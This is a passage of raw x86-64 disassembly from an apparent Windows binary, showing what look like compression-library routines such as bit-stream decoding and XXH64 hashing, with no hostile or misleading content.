   140001d5e:	83 e3 3f             	and    $0x3f,%ebx
   140001d61:	49 d3 ef             	shr    %cl,%r15
   140001d64:	0f b6 cb             	movzbl %bl,%ecx
   140001d67:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001d6c:	4c 23 f8             	and    %rax,%r15
   140001d6f:	4c 03 fa             	add    %rdx,%r15
   140001d72:	48 8b c6             	mov    %rsi,%rax
   140001d75:	43 8b 54 9d 00       	mov    0x0(%r13,%r11,4),%edx
   140001d7a:	4c 8b de             	mov    %rsi,%r11
   140001d7d:	48 d3 e8             	shr    %cl,%rax
   140001d80:	48 23 c2             	and    %rdx,%rax
   140001d83:	49 03 c0             	add    %r8,%rax
   140001d86:	44 8b 44 83 04       	mov    0x4(%rbx,%rax,4),%r8d
   140001d8b:	41 8b c0             	mov    %r8d,%eax
   140001d8e:	41 0f b7 d0          	movzwl %r8w,%edx
   140001d92:	c1 e8 18             	shr    $0x18,%eax
   140001d95:	41 c1 e8 10          	shr    $0x10,%r8d
   140001d99:	45 88 46 03          	mov    %r8b,0x3(%r14)
   140001d9d:	46 8d 14 08          	lea    (%rax,%r9,1),%r10d
   140001da1:	41 8b 44 85 00       	mov    0x0(%r13,%rax,4),%eax
   140001da6:	41 8b ca             	mov    %r10d,%ecx
   140001da9:	f7 d9                	neg    %ecx
   140001dab:	49 d3 eb             	shr    %cl,%r11
   140001dae:	4c 23 d8             	and    %rax,%r11
   140001db1:	4c 03 da             	add    %rdx,%r11
   140001db4:	49 83 c6 04          	add    $0x4,%r14
   140001db8:	e9 9a fe ff ff       	jmp    0x140001c57
   140001dbd:	4d 8d a8 fd 00 00 00 	lea    0xfd(%r8),%r13
   140001dc4:	4d 3b f5             	cmp    %r13,%r14
   140001dc7:	0f 87 6c 01 00 00    	ja     0x140001f39
   140001dcd:	0f 1f 00             	nopl   (%rax)
   140001dd0:	46 8b 4c bb 04       	mov    0x4(%rbx,%r15,4),%r9d
   140001dd5:	41 8b c1             	mov    %r9d,%eax
   140001dd8:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140001ddd:	c1 e8 10             	shr    $0x10,%eax
   140001de0:	45 8b c1             	mov    %r9d,%r8d
   140001de3:	41 c1 e8 18          	shr    $0x18,%r8d
   140001de7:	41 88 06             	mov    %al,(%r14)
   140001dea:	45 03 d0             	add    %r8d,%r10d
   140001ded:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140001df2:	49 ff c6             	inc    %r14
   140001df5:	41 83 fa 40          	cmp    $0x40,%r10d
   140001df9:	0f 87 1e 01 00 00    	ja     0x140001f1d
   140001dff:	41 8b ca             	mov    %r10d,%ecx
   140001e02:	48 8b d6             	mov    %rsi,%rdx
   140001e05:	f7 d9                	neg    %ecx
   140001e07:	48 d3 ea             	shr    %cl,%rdx
   140001e0a:	49 3b fc             	cmp    %r12,%rdi
   140001e0d:	72 0c                	jb     0x140001e1b
   140001e0f:	41 8b c2             	mov    %r10d,%eax
   140001e12:	48 c1 e8 03          	shr    $0x3,%rax
   140001e16:	48 2b f8             	sub    %rax,%rdi
   140001e19:	eb 2c                	jmp    0x140001e47
   140001e1b:	48 3b fd             	cmp    %rbp,%rdi
   140001e1e:	74 2e                	je     0x140001e4e
   140001e20:	41 8b ca             	mov    %r10d,%ecx
   140001e23:	48 8b c7             	mov    %rdi,%rax
   140001e26:	c1 e9 03             	shr    $0x3,%ecx
   140001e29:	48 2b c1             	sub    %rcx,%rax
   140001e2c:	48 3b c5             	cmp    %rbp,%rax
   140001e2f:	73 13                	jae    0x140001e44
   140001e31:	8b c7                	mov    %edi,%eax
   140001e33:	2b c5                	sub    %ebp,%eax
   140001e35:	48 2b f8             	sub    %rax,%rdi
   140001e38:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   140001e3f:	44 2b d0             	sub    %eax,%r10d
   140001e42:	eb 07                	jmp    0x140001e4b
   140001e44:	48 2b f9             	sub    %rcx,%rdi
   140001e47:	41 83 e2 07          	and    $0x7,%r10d
   140001e4b:	48 8b 37             	mov    (%rdi),%rsi
   140001e4e:	4d 3b f5             	cmp    %r13,%r14
   140001e51:	0f 87 e2 00 00 00    	ja     0x140001f39
   140001e57:	45 0f b7 f9          	movzwl %r9w,%r15d
   140001e5b:	48 8d 0d 1e 21 37 01 	lea    0x137211e(%rip),%rcx        # 0x141373f80
   140001e62:	46 8b 4c 9b 04       	mov    0x4(%rbx,%r11,4),%r9d
   140001e67:	42 8b 0c 81          	mov    (%rcx,%r8,4),%ecx
   140001e6b:	41 8b c1             	mov    %r9d,%eax
   140001e6e:	c1 e8 10             	shr    $0x10,%eax
   140001e71:	48 23 d1             	and    %rcx,%rdx
   140001e74:	41 88 06             	mov    %al,(%r14)
   140001e77:	45 8b c1             	mov    %r9d,%r8d
   140001e7a:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140001e7f:	4c 03 fa             	add    %rdx,%r15
   140001e82:	41 c1 e8 18          	shr    $0x18,%r8d
   140001e86:	49 83 c6 02          	add    $0x2,%r14
   140001e8a:	45 03 d0             	add    %r8d,%r10d
   140001e8d:	41 83 fa 40          	cmp    $0x40,%r10d
   140001e91:	77 6e                	ja     0x140001f01
   140001e93:	41 8b ca             	mov    %r10d,%ecx
   140001e96:	48 8b d6             	mov    %rsi,%rdx
   140001e99:	f7 d9                	neg    %ecx
   140001e9b:	48 d3 ea             	shr    %cl,%rdx
   140001e9e:	49 3b fc             	cmp    %r12,%rdi
   140001ea1:	72 0c                	jb     0x140001eaf
   140001ea3:	41 8b c2             	mov    %r10d,%eax
   140001ea6:	48 c1 e8 03          	shr    $0x3,%rax
   140001eaa:	48 2b f8             	sub    %rax,%rdi
   140001ead:	eb 2c                	jmp    0x140001edb
   140001eaf:	48 3b fd             	cmp    %rbp,%rdi
   140001eb2:	74 2e                	je     0x140001ee2
   140001eb4:	41 8b ca             	mov    %r10d,%ecx
   140001eb7:	48 8b c7             	mov    %rdi,%rax
   140001eba:	c1 e9 03             	shr    $0x3,%ecx
   140001ebd:	48 2b c1             	sub    %rcx,%rax
   140001ec0:	48 3b c5             	cmp    %rbp,%rax
   140001ec3:	73 13                	jae    0x140001ed8
   140001ec5:	8b c7                	mov    %edi,%eax
   140001ec7:	2b c5                	sub    %ebp,%eax
   140001ec9:	48 2b f8             	sub    %rax,%rdi
   140001ecc:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   140001ed3:	44 2b d0             	sub    %eax,%r10d
   140001ed6:	eb 07                	jmp    0x140001edf
   140001ed8:	48 2b f9             	sub    %rcx,%rdi
   140001edb:	41 83 e2 07          	and    $0x7,%r10d
   140001edf:	48 8b 37             	mov    (%rdi),%rsi
   140001ee2:	4d 3b f5             	cmp    %r13,%r14
   140001ee5:	77 52                	ja     0x140001f39
   140001ee7:	48 8d 0d 92 20 37 01 	lea    0x1372092(%rip),%rcx        # 0x141373f80
   140001eee:	45 0f b7 d9          	movzwl %r9w,%r11d
   140001ef2:	42 8b 0c 81          	mov    (%rcx,%r8,4),%ecx
   140001ef6:	48 23 d1             	and    %rcx,%rdx
   140001ef9:	4c 03 da             	add    %rdx,%r11
   140001efc:	e9 cf fe ff ff       	jmp    0x140001dd0
   140001f01:	42 8b 44 bb 04       	mov    0x4(%rbx,%r15,4),%eax
   140001f06:	c1 e8 10             	shr    $0x10,%eax
   140001f09:	41 88 06             	mov    %al,(%r14)
   140001f0c:	b8 03 00 00 00       	mov    $0x3,%eax
   140001f11:	48 03 44 24 30       	add    0x30(%rsp),%rax
   140001f16:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
   140001f1b:	eb 23                	jmp    0x140001f40
   140001f1d:	42 8b 44 9b 04       	mov    0x4(%rbx,%r11,4),%eax
   140001f22:	c1 e8 10             	shr    $0x10,%eax
   140001f25:	41 88 06             	mov    %al,(%r14)
   140001f28:	b8 02 00 00 00       	mov    $0x2,%eax
   140001f2d:	48 03 44 24 30       	add    0x30(%rsp),%rax
   140001f32:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
   140001f37:	eb 07                	jmp    0x140001f40
   140001f39:	48 c7 c0 ba ff ff ff 	mov    $0xffffffffffffffba,%rax
   140001f40:	4c 8b ac 24 98 02 00 	mov    0x298(%rsp),%r13
   140001f47:	00 
   140001f48:	4c 8b a4 24 d8 02 00 	mov    0x2d8(%rsp),%r12
   140001f4f:	00 
   140001f50:	4c 8b b4 24 90 02 00 	mov    0x290(%rsp),%r14
   140001f57:	00 
   140001f58:	48 8b 8c 24 80 02 00 	mov    0x280(%rsp),%rcx
   140001f5f:	00 
   140001f60:	48 33 cc             	xor    %rsp,%rcx
   140001f63:	e8 b8 a6 00 00       	call   0x14000c620
   140001f68:	48 81 c4 a0 02 00 00 	add    $0x2a0,%rsp
   140001f6f:	41 5f                	pop    %r15
   140001f71:	5f                   	pop    %rdi
   140001f72:	5e                   	pop    %rsi
   140001f73:	5d                   	pop    %rbp
   140001f74:	5b                   	pop    %rbx
   140001f75:	c3                   	ret
   140001f76:	cc                   	int3
   140001f77:	cc                   	int3
   140001f78:	cc                   	int3
   140001f79:	cc                   	int3
   140001f7a:	cc                   	int3
   140001f7b:	cc                   	int3
   140001f7c:	cc                   	int3
   140001f7d:	cc                   	int3
   140001f7e:	cc                   	int3
   140001f7f:	cc                   	int3
   140001f80:	40 53                	rex push %rbx
   140001f82:	56                   	push   %rsi
   140001f83:	57                   	push   %rdi
   140001f84:	48 83 ec 20          	sub    $0x20,%rsp
   140001f88:	48 8b d9             	mov    %rcx,%rbx
   140001f8b:	49 8b f8             	mov    %r8,%rdi
   140001f8e:	8b 49 48             	mov    0x48(%rcx),%ecx
   140001f91:	48 8b f2             	mov    %rdx,%rsi
   140001f94:	4c 01 03             	add    %r8,(%rbx)
   140001f97:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   140001f9b:	48 83 f8 20          	cmp    $0x20,%rax
   140001f9f:	73 1e                	jae    0x140001fbf
   140001fa1:	48 85 d2             	test   %rdx,%rdx
   140001fa4:	74 0c                	je     0x140001fb2
   140001fa6:	48 83 c1 28          	add    $0x28,%rcx
   140001faa:	48 03 cb             	add    %rbx,%rcx
   140001fad:	e8 fe 0d 02 00       	call   0x140022db0
   140001fb2:	01 7b 48             	add    %edi,0x48(%rbx)
   140001fb5:	33 c0                	xor    %eax,%eax
   140001fb7:	48 83 c4 20          	add    $0x20,%rsp
   140001fbb:	5f                   	pop    %rdi
   140001fbc:	5e                   	pop    %rsi
   140001fbd:	5b                   	pop    %rbx
   140001fbe:	c3                   	ret
   140001fbf:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001fc4:	4a 8d 2c 02          	lea    (%rdx,%r8,1),%rbp
   140001fc8:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140001fcd:	49 be 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%r14
   140001fd4:	ae b2 c2 
   140001fd7:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   140001fdc:	49 bf 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%r15
   140001fe3:	79 37 9e 
   140001fe6:	85 c9                	test   %ecx,%ecx
   140001fe8:	0f 84 86 00 00 00    	je     0x140002074
   140001fee:	bf 20 00 00 00       	mov    $0x20,%edi
   140001ff3:	44 8b c7             	mov    %edi,%r8d
   140001ff6:	44 2b c1             	sub    %ecx,%r8d
   140001ff9:	48 83 c1 28          	add    $0x28,%rcx
   140001ffd:	48 03 cb             	add    %rbx,%rcx
   140002000:	e8 ab 0d 02 00       	call   0x140022db0
   140002005:	48 8b 43 28          	mov    0x28(%rbx),%rax
   140002009:	2b 7b 48             	sub    0x48(%rbx),%edi
   14000200c:	49 0f af c6          	imul   %r14,%rax
   140002010:	48 03 43 08          	add    0x8(%rbx),%rax
   140002014:	48 c1 c0 1f          	rol    $0x1f,%rax
   140002018:	49 0f af c7          	imul   %r15,%rax
   14000201c:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140002020:	48 8b 43 30          	mov    0x30(%rbx),%rax
   140002024:	49 0f af c6          	imul   %r14,%rax
   140002028:	48 03 43 10          	add    0x10(%rbx),%rax
   14000202c:	48 c1 c0 1f          	rol    $0x1f,%rax
   140002030:	49 0f af c7          	imul   %r15,%rax
   140002034:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002038:	48 8b 43 38          	mov    0x38(%rbx),%rax
   14000203c:	49 0f af c6          	imul   %r14,%rax
   140002040:	48 03 43 18          	add    0x18(%rbx),%rax
   140002044:	48 c1 c0 1f          	rol    $0x1f,%rax
   140002048:	49 0f af c7          	imul   %r15,%rax
   14000204c:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002050:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140002054:	49 0f af c6          	imul   %r14,%rax
   140002058:	c7 43 48 00 00 00 00 	movl   $0x0,0x48(%rbx)
   14000205f:	48 03 43 20          	add    0x20(%rbx),%rax
   140002063:	48 c1 c0 1f          	rol    $0x1f,%rax
   140002067:	49 0f af c7          	imul   %r15,%rax
   14000206b:	48 89 43 20          	mov    %rax,0x20(%rbx)
   14000206f:	8b c7                	mov    %edi,%eax
   140002071:	48 03 f0             	add    %rax,%rsi
   140002074:	48 8d 46 20          	lea    0x20(%rsi),%rax
   140002078:	48 3b c5             	cmp    %rbp,%rax
   14000207b:	77 78                	ja     0x1400020f5
   14000207d:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002081:	4c 8d 55 e0          	lea    -0x20(%rbp),%r10
   140002085:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140002089:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   14000208d:	4c 8b 4b 20          	mov    0x20(%rbx),%r9
   140002091:	48 8b 06             	mov    (%rsi),%rax
   140002094:	49 0f af c6          	imul   %r14,%rax
   140002098:	48 03 c8             	add    %rax,%rcx
   14000209b:	48 8b 46 08          	mov    0x8(%rsi),%rax
   14000209f:	49 0f af c6          	imul   %r14,%rax
   1400020a3:	48 c1 c1 1f          	rol    $0x1f,%rcx
   1400020a7:	48 03 d0             	add    %rax,%rdx
   1400020aa:	48 8b 46 10          	mov    0x10(%rsi),%rax
   1400020ae:	49 0f af c6          	imul   %r14,%rax
   1400020b2:	49 0f af cf          	imul   %r15,%rcx
   1400020b6:	4c 03 c0             	add    %rax,%r8
   1400020b9:	48 c1 c2 1f          	rol    $0x1f,%rdx
   1400020bd:	48 8b 46 18          	mov    0x18(%rsi),%rax
   1400020c1:	48 83 c6 20          	add    $0x20,%rsi
   1400020c5:	49 0f af c6          	imul   %r14,%rax
   1400020c9:	49 0f af d7          	imul   %r15,%rdx
   1400020cd:	4c 03 c8             	add    %rax,%r9
   1400020d0:	49 c1 c0 1f          	rol    $0x1f,%r8
   1400020d4:	49 c1 c1 1f          	rol    $0x1f,%r9
   1400020d8:	4d 0f af cf          	imul   %r15,%r9
   1400020dc:	4d 0f af c7          	imul   %r15,%r8
   1400020e0:	49 3b f2             	cmp    %r10,%rsi
   1400020e3:	76 ac                	jbe    0x140002091
   1400020e5:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   1400020e9:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   1400020ed:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   1400020f1:	4c 89 4b 20          	mov    %r9,0x20(%rbx)
   1400020f5:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400020fa:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400020ff:	48 3b f5             	cmp    %rbp,%rsi
   140002102:	73 17                	jae    0x14000211b
   140002104:	4c 8b c5             	mov    %rbp,%r8
   140002107:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
   14000210b:	4c 2b c6             	sub    %rsi,%r8
   14000210e:	48 8b d6             	mov    %rsi,%rdx
   140002111:	e8 9a 0c 02 00       	call   0x140022db0
   140002116:	2b ee                	sub    %esi,%ebp
   140002118:	89 6b 48             	mov    %ebp,0x48(%rbx)
   14000211b:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140002120:	33 c0                	xor    %eax,%eax
   140002122:	48 83 c4 20          	add    $0x20,%rsp
   140002126:	5f                   	pop    %rdi
   140002127:	5e                   	pop    %rsi
   140002128:	5b                   	pop    %rbx
   140002129:	c3                   	ret
   14000212a:	cc                   	int3
   14000212b:	cc                   	int3
   14000212c:	cc                   	int3
   14000212d:	cc                   	int3
   14000212e:	cc                   	int3
   14000212f:	cc                   	int3
   140002130:	40 55                	rex push %rbp
   140002132:	56                   	push   %rsi
   140002133:	41 54                	push   %r12
   140002135:	41 55                	push   %r13
   140002137:	8b 41 48             	mov    0x48(%rcx),%eax
   14000213a:	48 8d 69 28          	lea    0x28(%rcx),%rbp
   14000213e:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140002143:	48 8d 71 28          	lea    0x28(%rcx),%rsi
   140002147:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   14000214c:	48 03 e8             	add    %rax,%rbp
   14000214f:	4c 8b 39             	mov    (%rcx),%r15
   140002152:	4c 8b f1             	mov    %rcx,%r14
   140002155:	49 b8 c5 67 56 16 2f 	movabs $0x27d4eb2f165667c5,%r8
   14000215c:	eb d4 27 
   14000215f:	49 bd 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%r13
   140002166:	ae b2 c2 
   140002169:	49 bc 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%r12
   140002170:	79 37 9e 
   140002173:	49 ba 9d 51 4d 3d 88 	movabs $0x7a1435883d4d519d,%r10
   14000217a:	35 14 7a 
   14000217d:	49 83 ff 20          	cmp    $0x20,%r15
   140002181:	0f 82 c4 00 00 00    	jb     0x14000224b
   140002187:	4c 8b 51 08          	mov    0x8(%rcx),%r10
   14000218b:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   14000218f:	49 8b c2             	mov    %r10,%rax
   140002192:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140002196:	4d 8b c8             	mov    %r8,%r9
   140002199:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   14000219d:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400021a2:	48 8b da             	mov    %rdx,%rbx
   1400021a5:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400021aa:	48 8b f9             	mov    %rcx,%rdi
   1400021ad:	49 0f af c5          	imul   %r13,%rax
   1400021b1:	49 0f af dd          	imul   %r13,%rbx
   1400021b5:	49 0f af fd          	imul   %r13,%rdi
   1400021b9:	4d 0f af cd          	imul   %r13,%r9
   1400021bd:	48 c1 c0 1f          	rol    $0x1f,%rax
   1400021c1:	49 0f af c4          	imul   %r12,%rax
   1400021c5:	49 c1 c0 07          	rol    $0x7,%r8
   1400021c9:	49 d1 c2             	rol    $1,%r10
   1400021cc:	48 c1 c3 1f          	rol    $0x1f,%rbx
   1400021d0:	49 0f af dc          	imul   %r12,%rbx
   1400021d4:	48 c1 c2 0c          	rol    $0xc,%rdx
   1400021d8:	48 c1 c1 12          	rol    $0x12,%rcx
   1400021dc:	48 c1 c7 1f          	rol    $0x1f,%rdi
   1400021e0:	49 c1 c1 1f          	rol    $0x1f,%r9
   1400021e4:	4d 0f af cc          	imul   %r12,%r9
   1400021e8:	49 0f af fc          	imul   %r12,%rdi
   1400021ec:	4c 8d 1c 11          	lea    (%rcx,%rdx,1),%r11
   1400021f0:	4d 03 d8             	add    %r8,%r11
   1400021f3:	49 b8 c5 67 56 16 2f 	movabs $0x27d4eb2f165667c5,%r8
   1400021fa:	eb d4 27 
   1400021fd:	4d 03 da             	add    %r10,%r11
   140002200:	49 ba 9d 51 4d 3d 88 	movabs $0x7a1435883d4d519d,%r10
   140002207:	35 14 7a 
   14000220a:	4c 33 d8             	xor    %rax,%r11
   14000220d:	48 b8 63 ae b2 c2 77 	movabs $0x85ebca77c2b2ae63,%rax
   140002214:	ca eb 85 
   140002217:	4d 0f af dc          	imul   %r12,%r11
   14000221b:	49 03 c7             	add    %r15,%rax
   14000221e:	4d 2b da             	sub    %r10,%r11
   140002221:	4d 33 d9             	xor    %r9,%r11
   140002224:	4d 0f af dc          	imul   %r12,%r11
   140002228:	4d 2b da             	sub    %r10,%r11
   14000222b:	4c 33 db             	xor    %rbx,%r11
   14000222e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140002233:	4d 0f af dc          	imul   %r12,%r11
   140002237:	4d 2b da             	sub    %r10,%r11
   14000223a:	4c 33 df             	xor    %rdi,%r11
   14000223d:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140002242:	4d 0f af dc          	imul   %r12,%r11
   140002246:	49 03 c3             	add    %r11,%rax
   140002249:	eb 08                	jmp    0x140002253
   14000224b:	4b 8d 04 07          	lea    (%r15,%r8,1),%rax
   14000224f:	48 03 41 18          	add    0x18(%rcx),%rax
   140002253:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   140002258:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   14000225c:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140002261:	48 3b cd             	cmp    %rbp,%rcx
   140002264:	77 37                	ja     0x14000229d
   140002266:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000226d:	00 00 00 
   140002270:	48 8b 0e             	mov    (%rsi),%rcx
   140002273:	48 8b d6             	mov    %rsi,%rdx
   140002276:	49 0f af cd          	imul   %r13,%rcx
   14000227a:	48 83 c6 08          	add    $0x8,%rsi
   14000227e:	48 c1 c1 1f          	rol    $0x1f,%rcx
   140002282:	49 0f af cc          	imul   %r12,%rcx
   140002286:	48 33 c1             	xor    %rcx,%rax
   140002289:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   14000228d:	48 c1 c0 1b          	rol    $0x1b,%rax
   140002291:	49 0f af c4          	imul   %r12,%rax
   140002295:	49 2b c2             	sub    %r10,%rax
   140002298:	48 3b cd             	cmp    %rbp,%rcx
   14000229b:	76 d3                	jbe    0x140002270
   14000229d:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   1400022a1:	49 b9 f9 79 37 9e b1 	movabs $0x165667b19e3779f9,%r9
   1400022a8:	67 56 16 
   1400022ab:	48 3b d5             	cmp    %rbp,%rdx
   1400022ae:	77 17                	ja     0x1400022c7
   1400022b0:	8b 0e                	mov    (%rsi),%ecx
   1400022b2:	48 8b f2             	mov    %rdx,%rsi
   1400022b5:	49 0f af cc          	imul   %r12,%rcx
   1400022b9:	48 33 c1             	xor    %rcx,%rax
   1400022bc:	48 c1 c0 17          	rol    $0x17,%rax
   1400022c0:	49 0f af c5          	imul   %r13,%rax
   1400022c4:	49 03 c1             	add    %r9,%rax
   1400022c7:	48 3b f5             	cmp    %rbp,%rsi
   1400022ca:	73 1e                	jae    0x1400022ea
   1400022cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400022d0:	0f b6 0e             	movzbl (%rsi),%ecx
   1400022d3:	48 ff c6             	inc    %rsi
   1400022d6:	49 0f af c8          	imul   %r8,%rcx
   1400022da:	48 33 c1             	xor    %rcx,%rax
   1400022dd:	48 c1 c0 0b          	rol    $0xb,%rax
   1400022e1:	49 0f af c4          	imul   %r12,%rax
   1400022e5:	48 3b f5             	cmp    %rbp,%rsi
   1400022e8:	72 e6                	jb     0x1400022d0
   1400022ea:	48 8b c8             	mov    %rax,%rcx
   1400022ed:	48 c1 e9 21          	shr    $0x21,%rcx
   1400022f1:	48 33 c8             	xor    %rax,%rcx
   1400022f4:	49 0f af cd          	imul   %r13,%rcx
   1400022f8:	48 8b d1             	mov    %rcx,%rdx
   1400022fb:	48 c1 ea 1d          	shr    $0x1d,%rdx
   1400022ff:	48 33 d1             	xor    %rcx,%rdx
   140002302:	49 0f af d1          	imul   %r9,%rdx
   140002306:	48 8b c2             	mov    %rdx,%rax
   140002309:	48 c1 e8 20          	shr    $0x20,%rax
   14000230d:	48 33 c2             	xor    %rdx,%rax
   140002310:	41 5d                	pop    %r13
   140002312:	41 5c                	pop    %r12
   140002314:	5e                   	pop    %rsi
   140002315:	5d                   	pop    %rbp
   140002316:	c3                   	ret
   140002317:	cc                   	int3
   140002318:	cc                   	int3
   140002319:	cc                   	int3
   14000231a:	cc                   	int3
   14000231b:	cc                   	int3
   14000231c:	cc                   	int3
   14000231d:	cc                   	int3
   14000231e:	cc                   	int3
   14000231f:	cc                   	int3
   140002320:	40 53                	rex push %rbx
   140002322:	55                   	push   %rbp
   140002323:	56                   	push   %rsi
   140002324:	57                   	push   %rdi
   140002325:	41 54                	push   %r12
   140002327:	41 56                	push   %r14
   140002329:	41 57                	push   %r15
   14000232b:	48 83 ec 70          	sub    $0x70,%rsp
   14000232f:	48 8b 05 ca 5c 37 01 	mov    0x1375cca(%rip),%rax        # 0x141378000
   140002336:	48 33 c4             	xor    %rsp,%rax
   140002339:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000233e:	48 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%rdi
   140002345:	00 
   140002346:	4d 8b f9             	mov    %r9,%r15
   140002349:	4c 89 4c 24 48       	mov    %r9,0x48(%rsp)
   14000234e:	49 8b f0             	mov    %r8,%rsi
   140002351:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002356:	4c 8b e2             	mov    %rdx,%r12
   140002359:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000235e:	4c 8b f1             	mov    %rcx,%r14
   140002361:	49 8b d9             	mov    %r9,%rbx
   140002364:	48 83 ff 08          	cmp    $0x8,%rdi
   140002368:	73 54                	jae    0x1400023be
   14000236a:	33 ed                	xor    %ebp,%ebp
   14000236c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002371:	4c 8b c7             	mov    %rdi,%r8
   140002374:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140002379:	49 8b d1             	mov    %r9,%rdx
   14000237c:	e8 2f 0a 02 00       	call   0x140022db0
   140002381:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140002386:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   14000238a:	4c 8b c6             	mov    %rsi,%r8
   14000238d:	48 c7 44 24 20 08 00 	movq   $0x8,0x20(%rsp)
   140002394:	00 00 
   140002396:	49 8b d4             	mov    %r12,%rdx
   140002399:	49 8b ce             	mov    %r14,%rcx
   14000239c:	e8 7f ff ff ff       	call   0x140002320
   1400023a1:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400023a5:	0f 87 55 02 00 00    	ja     0x140002600
   1400023ab:	48 3b c7             	cmp    %rdi,%rax
   1400023ae:	48 c7 c1 ec ff ff ff 	mov    $0xffffffffffffffec,%rcx
   1400023b5:	48 0f 47 c1          	cmova  %rcx,%rax
   1400023b9:	e9 42 02 00 00       	jmp    0x140002600
   1400023be:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   1400023c3:	44 8b 2a             	mov    (%rdx),%r13d
   1400023c6:	33 d2                	xor    %edx,%edx
   1400023c8:	41 ff c5             	inc    %r13d
   1400023cb:	45 8b c5             	mov    %r13d,%r8d
   1400023ce:	4d 03 c0             	add    %r8,%r8
   1400023d1:	e8 1a 11 02 00       	call   0x1400234f0
   1400023d6:	45 8b 07             	mov    (%r15),%r8d
   1400023d9:	41 8b c0             	mov    %r8d,%eax
   1400023dc:	83 e0 0f             	and    $0xf,%eax
   1400023df:	8d 48 05             	lea    0x5(%rax),%ecx
   1400023e2:	83 f9 0f             	cmp    $0xf,%ecx
   1400023e5:	76 0c                	jbe    0x1400023f3
   1400023e7:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   1400023ee:	e9 08 02 00 00       	jmp    0x1400025fb
   1400023f3:	4c 03 ff             	add    %rdi,%r15
   1400023f6:	41 c1 e8 04          	shr    $0x4,%r8d
   1400023fa:	33 ed                	xor    %ebp,%ebp
   1400023fc:	89 0e                	mov    %ecx,(%rsi)
   1400023fe:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140002404:	44 8b d5             	mov    %ebp,%r10d
   140002407:	41 d3 e4             	shl    %cl,%r12d
   14000240a:	44 8b cd             	mov    %ebp,%r9d
   14000240d:	45 8b dc             	mov    %r12d,%r11d
   140002410:	4d 8d 77 f9          	lea    -0x7(%r15),%r14
   140002414:	41 83 cb 01          	or     $0x1,%r11d
   140002418:	49 8d 77 fc          	lea    -0x4(%r15),%rsi
   14000241c:	83 c0 06             	add    $0x6,%eax
   14000241f:	ba 04 00 00 00       	mov    $0x4,%edx
   140002424:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140002428:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000242f:	00 
   140002430:	45 85 c9             	test   %r9d,%r9d
   140002433:	0f 84 b8 00 00 00    	je     0x1400024f1
   140002439:	41 8b c0             	mov    %r8d,%eax
   14000243c:	f7 d0                	not    %eax
   14000243e:	0f ba e8 1f          	bts    $0x1f,%eax
   140002442:	44 0f bc c8          	bsf    %eax,%r9d
   140002446:	41 d1 e9             	shr    $1,%r9d
   140002449:	41 83 f9 0c          	cmp    $0xc,%r9d
   14000244d:	72 3d                	jb     0x14000248c
   14000244f:	90                   	nop
   140002450:	41 83 c2 24          	add    $0x24,%r10d
   140002454:	49 3b de             	cmp    %r14,%rbx
   140002457:	77 06                	ja     0x14000245f
   140002459:	48 83 c3 03          	add    $0x3,%rbx
   14000245d:	eb 0f                	jmp    0x14000246e
   14000245f:	41 2b df             	sub    %r15d,%ebx
   140002462:	8d 14 da             	lea    (%rdx,%rbx,8),%edx
   140002465:	48 8b de             	mov    %rsi,%rbx
